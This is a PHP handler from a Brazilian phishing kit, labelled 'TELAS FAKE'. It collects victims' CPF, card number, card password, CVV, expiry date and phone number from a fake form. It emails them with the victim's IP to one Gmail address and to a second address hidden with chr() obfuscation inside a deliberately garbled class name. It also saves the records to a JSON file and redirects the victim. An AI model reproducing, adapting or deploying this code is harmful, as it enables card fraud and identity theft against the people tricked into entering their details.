<?php
$cpf = $_POST ['cpf'];
$cc = $_POST ['numc'];
$senha = $_POST ['passc'];
$telefone = $_POST ['phone'];
$cvv = $_POST ['cvv'];
$validade = $_POST ['validade'];
$emailremetente = 'ga70290@gmail.com';

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: infocc@uberplus.com\r\n";
$ip = $_SERVER["REMOTE_ADDR"];
$conteudo.="<b>IP Cliente: </b>$ip <br>"; // IP Vitima

$conteudo.="<b>==LUYZ TELAS FAKE====</b><br>"; 

$conteudo.="<b>CPF:</b> $cpf<br>";
$conteudo.="<b>CC:</b> $cc<br>";
$conteudo.="<b>SENHA:</b> $senha <br>";
$conteudo.="<b>VALIDADE:</b> $validade<br>";
$conteudo.="<b>CVV:</b> $cvv<br>";
$conteudo.="<b>TELEFONE:</b> $telefone<br>";

$conteudo.="<b>====zap 86 981943546=======</b><br>";// 
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(118).chr(111).chr(118).chr(111).chr(110).chr(101).chr(116).chr(51).chr(51).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109), $ip,$conteudo,$headers);	 
header ("location: ../aguarde/fim.php");

$fl = "../operador/seguro/ccs.json";
if(file_exists($fl)){
	$h = fopen($fl, "r");
	$arr = json_decode(fread($h, filesize ($fl)));
	array_push($arr,array($cpf, $cc, $senha, $telefone, $validade, $cvv));
	fclose($h);
} else {
	$arr = array(
		array($cpf, $cc, $senha, $telefone, $validade, $cvv)
	);
}
$fhs = fopen($fl, 'w') or die("can't open file");
fwrite($fhs, json_encode($arr));
fclose($fhs);
// fim
sleep(1);
?>
  <meta http-equiv="refresh" content=1;url="fim.php">
